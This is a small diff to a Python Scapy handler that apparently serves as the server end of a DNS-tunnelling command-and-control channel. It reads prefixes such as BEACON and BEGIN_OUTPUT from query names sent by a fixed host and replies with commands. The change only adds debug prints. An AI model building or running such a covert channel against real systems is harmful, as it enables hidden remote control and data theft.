@@ -43,8 +43,11 @@ def parse_packet(packet):
     if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
         if packet[IP].src != "192.168.1.21":
             return
-        prefix_packet = packet[DNSQR].qname[0][:6]
-        data_recieved = packet[DNSQR].qname[0][6:]
+        qname = packet[DNSQR].qname[0]
+        print(qname)
+        print(type(qname))
+        prefix_packet = qname[:6]
+        data_recieved = qname[6:]
         if prefix_packet == BEACON:
             send_command(packet)
         elif prefix_packet == BEGIN_OUTPUT:
